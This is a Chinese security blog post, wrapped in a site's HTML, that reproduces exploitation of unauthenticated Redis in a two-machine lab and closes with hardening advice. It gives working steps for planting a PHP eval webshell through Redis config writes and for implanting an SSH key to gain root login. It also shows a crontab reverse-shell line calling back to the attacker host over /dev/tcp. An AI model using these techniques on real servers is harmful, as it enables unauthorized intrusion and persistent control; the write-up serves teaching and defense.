@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.3.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.3.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.3.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="0X01    漏洞简介以及危害1、什么是redis未授权访问漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis未授权访问漏洞复现与利用">
+<meta property="og:url" content="https://ChakaLake.github.io/2019/12/29/Redis未授权访问漏洞复现与利用/index.html">
+<meta property="og:site_name" content="他年少如歌">
+<meta property="og:description" content="0X01    漏洞简介以及危害1、什么是redis未授权访问漏洞">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122901.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122902.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122903.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122904.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122905.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122906.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122907.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122908.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122909.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122910.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122911.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122912.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122913.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122914.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122915.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122916.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122917.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122918.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122919.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122920.png">
+<meta property="og:updated_time" content="2020-01-01T07:00:32.089Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Redis未授权访问漏洞复现与利用">
+<meta name="twitter:description" content="0X01    漏洞简介以及危害1、什么是redis未授权访问漏洞">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122901.png">
+  <link rel="canonical" href="https://ChakaLake.github.io/2019/12/29/Redis未授权访问漏洞复现与利用/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Redis未授权访问漏洞复现与利用 | 他年少如歌</title>
+  <meta name="generator" content="Hexo 3.9.0">
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">他年少如歌</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">人生如棋，我愿为卒，行动虽慢，但谁曾见我后退一步！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+  </ul>
+
+    
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://ChakaLake.github.io/2019/12/29/Redis未授权访问漏洞复现与利用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Yang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="他年少如歌">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">Redis未授权访问漏洞复现与利用
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-12-29 07:41:07" itemprop="dateCreated datePublished" datetime="2019-12-29T07:41:07+08:00">2019-12-29</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-01-01 15:00:32" itemprop="dateModified" datetime="2020-01-01T15:00:32+08:00">2020-01-01</time>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>0X01    漏洞简介以及危害</p><p>1、什么是redis未授权访问漏洞</p><a id="more"></a>
+
+<p>​        Redis默认情况下，会绑定0.0.0.0:6379，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，这样将会将Redis暴漏到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下，利用Redis自身提供的config命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件的authotrized_keys文件中，进行可以使用对应私钥直接使用ssh服务登录目标服务器。<br>​        简单说，漏洞的产生条件有以下两点：<br>①redis绑定在0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴漏在公网；<br>②没有设置密码认证（一般为空），可以避免远程登录redis服务。</p>
+<p>2、漏洞的危害</p>
+<p>①攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以执行flushall来清空所有数据；<br>②攻击者可以通过eval执行lua代码，或通过数据备份功能往磁盘写入后门文件；<br>③最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SHH公钥文件，直接通过ssh登录受害服务器。</p>
+<p>3、漏洞影响</p>
+<p><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122901.png" alt><br>根据ZoomEye的探测，全球无验证可直接利用的Redis分布情况如下：<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122902.jpg" alt><br>全球无验证可直接利用Redis TOP10国家与地区：<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122903.jpg" alt></p>
+<p>0X02    漏洞复现</p>
+<p>下载并安装测试用的Redis<br><code>wget http://download.redis.io/releases/redis-2.8.17.tar.gz</code><br><code>（也可以直接下载：http://distflies.macports.org/redis/）</code><br>解压安装包：tar xzf redis-3.2.8.tar.gz<br>进行redis目录：cd redis-3.2.8<br>安装：make<br>make结束后，进入src目录：cd src<br>将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次进入安装目录了）<br>返回目录redis-3.2.8，将redis.conf拷贝到/etc目录下<br>使用/etc目录下的redis.conf文件中的配置启动redis服务<br>服务启动成功，我们克隆这台虚拟机，一台作为攻击机，一台作为靶机。<br>攻击机IP：192.168.8.8<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122904.png" alt><br>靶机IP：192.168.8.7<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122905.png" alt><br>启动redis服务进程后，就可以使用攻击机redis-cli和靶机的redis服务交互了.<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122906.png" alt></p>
+<p>0X03    未授权访问漏洞测试</p>
+<p>使用redis客户端直接无账号车公共等redis<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122907.png" alt><br>从登录的结果可以看出该redis服务对公网开放，且未启用认证。</p>
+<p>1、利用redis写webshell</p>
+<p>利用前提：<br>①靶机redis链接未授权，在攻击机上能用redis-cli连接，并未登录验证。<br>②开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路径），还需要具有文件读写增删改查权限（dir设置目录，dbfilename设置文件，最后执行save或bgsave保存）。<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122908.png" alt><br>shell写入完成，在靶机上来证明<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122909.png" alt><br>成功写入shell。<br>当数据库过大时，redis写shell的小技巧：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$fp=fopen(<span class="string">'hacker.php'</span>,<span class="string">'w'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'&lt;?phpp @eval($_POST[\"hacker\"])?&gt;'</span>);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2、利用公私钥认证获取root权限</p>
+<p>靶机中开启redis服务：redis-server /etc/redis.conf<br>在靶机中执行mkdir /root/.ssh命令，创建ssh公钥存放目录（靶机时作为ssh服务器使用的）<br>在攻击机中生成ssh公钥和私钥，密码设置为空：<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122910.png" alt><br>进入.ssh目录，cd  .ssh/，将生成的公钥保存到1.txt。<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122911.png" alt><br>来凝结靶机上的redis服务，将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）：<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122912.png" alt><br>远程登录靶机的redis服务：redis-cli -h 192.168.8.7<br>并使用config get dir命令得到redis备份的路径<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122913.png" alt><br>更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）：<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122914.png" alt><br>设置上传公钥的备份文件名字为authorized_keys：<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122915.png" alt><br>检查是否更改成功（查看有没有authorized_keys文件），然后保存退出，至此成功写入ssh公钥到靶机。<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122916.png" alt><br>在攻击机上使用ssh免密登录靶机：ssh -i id_rsa <a href="mailto:root@192.168.8.7" target="_blank" rel="noopener">root@192.168.8.7</a><br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122917.png" alt><br>利用私钥成功登录redis服务器。</p>
+<p>3、利用crontab反弹shell</p>
+<p>在攻击者服务器上监听一个端口（未被占用的任意端口）：<br><code>nc -lvn 4444</code><br>连接redis，写入反弹shell<br><code>redis-cli -h 192.168.8.7</code><br><code>set xxx &quot;\n\n*/1****/bin/bash -i&gt;7/dev/tcp/192.168.8.8/4444 0&gt;&amp;1\n\n&quot;</code><br><code>config set dir /var/spool/</code><br><code>config set dbfilename root</code><br><code>save</code><br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122918.png" alt><br>过一分钟左右就可以收到shell。</p>
+<p>0X04    解决方案</p>
+<p>1、比较安全的办法就是采用绑定IP的方式来进行控制。<br>请在redis.conf文件找到如下配置：<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122919.png" alt><br>把#bind 127.0.0.1前面的注释#号去掉，然后把127.0.0.1改成你允许访问的IP地址，表示只允许该IP进行访问，这种情况下，我们启动redis服务器的时候不能再用：redis-server，改为reidis-server path/redis.conf即在启动的时候指定需要加载的配置文件，其中path/是你上面修改的reids配置文件所在目录，这个方法有一点不太好，难免有多台机器访问一个redis服务。<br>2、设置密码，以提供远程登录<br>代开redis.conf配置文件，找到requirepass，然后修改如下；<br><code>requirepass 123456</code><br>设置密码以后发现可以登录，但是无法执行命令了。<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/122920.png" alt></p>
+
+    </div>
+
+    
+    
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-heart"></i>感谢阅读-------------</div>
+    
+</div>
+  
+</div>
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/12/21/SSRF(二)-SSRF利用及代码分析/" rel="next" title="SSRF(二)|SSRF利用及代码分析">
+                  <i class="fa fa-chevron-left"></i> SSRF(二)|SSRF利用及代码分析
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/01/01/文件上传(一)-基础/" rel="prev" title="文件上传(一)|基础">
+                  文件上传(一)|基础 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc" data-target="post-toc-wrap">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Yang</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yang</span>
+</div>
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.3.0</div>
+-->
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.3.0"></script><script src="/js/motion.js?v=7.3.0"></script>
+<script src="/js/schemes/muse.js?v=7.3.0"></script>
+<script src="/js/next-boot.js?v=7.3.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+ <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
